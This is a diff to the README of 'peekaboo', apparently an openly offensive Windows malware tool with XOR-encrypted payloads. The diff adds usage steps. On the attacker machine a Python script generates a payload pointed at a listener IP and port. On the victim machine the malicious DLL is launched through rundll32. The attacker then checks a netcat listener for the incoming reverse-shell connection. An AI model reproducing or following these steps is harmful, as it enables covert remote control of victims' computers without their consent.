@@ -9,16 +9,36 @@ XOR encryption and decryption for functions call and main payload - `calc.exe` a
 ## Usage
 ## 1. DLL
 ### on attacker machine
+
+check your IP:
+```bash
+ip a
+```
+
+![attacker machine IP](./screenshots/1.png?raw=true)
+
 run python script with flags:
 ```bash
-python3 peekaboo.py -l 10.10.14.3 -p 4444
+python3 peekaboo.py -l 10.9.1.6 -p 4444
 ```
+
+![run python script](./screenshots/2.png?raw=true)
 
 ### then on victim machine (windows x64):
 run on powershell or cmd promt:
+```cmd
+rundll32 .\peekaboo.dll, BMzUWjfJOsdaiCQzbTLM
 ```
-rundll32 .\peekaboo.dll, TpLbDJOWUjUmGyuHWpKk
-```
+
+![run on victim machine](./screenshots/3.png?raw=true)
+
+### check on attacker machine:
+check your netcat listener:
+
+![check netcat listener](./screenshots/4.png?raw=true)
+
+example:
+![final](./screenshots/5.png?raw=true)
 
 ## 2.Injector
 ### on attacker machine:
